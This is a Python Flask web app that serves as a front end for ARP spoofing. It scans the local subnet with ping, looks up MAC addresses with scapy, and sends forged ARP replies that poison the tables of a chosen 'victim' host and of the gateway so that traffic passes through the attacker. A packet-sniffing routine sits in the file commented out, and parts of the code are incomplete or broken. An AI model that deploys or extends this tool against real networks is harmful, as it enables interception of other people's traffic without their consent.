from flask import Flask, request, render_template, redirect, url_for
from scapy.all import Ether, ARP, srp, send, conf, get_if_addr, sniff, IP
from threading import Event
import scapy.all as scapy
import time
import ipaddress
import netifaces
import ipaddress
import subprocess
import concurrent.futures
import platform
import socket

app = Flask(__name__)

gateways = netifaces.gateways()
gateway_ip = gateways['default'][netifaces.AF_INET][0]

hostname=socket.gethostname()   
local_ip=socket.gethostbyname(hostname) 

# def get_network_range(ip_address):
#     network = ipaddress.ip_interface(ip_address+'/24')
#     network_range = set(str(ip) for ip in network.network.hosts())
#     return network_range


# itterares to the ips and sends them a ping request to see if they are active 
def ping_ip(ip):
    try:
        if platform.system() == 'Windows':
            result = subprocess.run(['ping', '-n', '1', '-w', '100', ip], capture_output=True)
        else:
            result = subprocess.run(['ping', '-c', '1', '-W', '1', ip], capture_output=True)

        if result.returncode == 0:
            return ip
    except Exception:
        pass



# multithreds on multiple ips 
def get_active_ips(ip_address):
    network = ipaddress.ip_interface(ip_address+'/24')
    network_range = network.network
    active_ips = set()

    with concurrent.futures.ThreadPoolExecutor() as executor:
        ip_list = [str(ip) for ip in network_range.hosts()]
        results = executor.map(ping_ip, ip_list)
        active_ips = set(filter(None, results))

    active_ips.discard(gateway_ip)
    active_ips.discard(local_ip)
    return active_ips


#get our mac address, the mac of the victum and that of the router
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast,
                              timeout=5, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

#sends the victum spoofed packets to change the arp table 
def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip),
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)

#restores the connection after spoofing 
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

#when you start the app starts scanning the ips 
@app.route('/', methods=['GET'])
def home():
    active_ips = get_active_ips(gateway_ip)
    sorted_network_range = sorted(active_ips)
    return render_template('index.html', gateway_ip=gateway_ip,
                           network_range=sorted_network_range)

#when you press spoof it starts the prosses of spoofing 
@app.route('/spoof', methods=['POST'])
def spoof_ip():
    target_ip = request.form.get('target_ip')
    gateway_ip = request.form.get('gateway_ip')

    # performs 
    try:

        if get_mac(target_ip) is None or get_mac(gateway_ip) is None:
            error_message = f"No response from IP: {target_ip if get_mac(target_ip) is None else gateway_ip}"
            return render_template('capture.html', error=error_message)
        else:
            sent_packets_count = 0
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            for i in range(10):
                sent_packets_count = sent_packets_count + 2
                print("\r[*] Packets Sent "+str(sent_packets_count), end="")
                time.sleep(2)  # Waits for two seconds
            return render_template('capture.html', data=str(sent_packets_count))

    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        print("[+] Arp Spoof Stopped")

    return redirect(url_for('capture'))


# def sniff_packets(stop_event):
#     def process_packet(packet):
#         return {
#             'time': time.time(),
#             'source_ip': packet[IP].src,
#             'destination_ip': packet[IP].dst,
#             'summary': packet.summary(),
#         }

#     while not stop_event.is_set():
#         packet = sniff(count=1)[0]
#         yield process_packet(packet)


# @app.route('/capture')
# def capture():
#     return render_template('capture.html')


if __name__ == '__main__':
    app.run(debug=True)
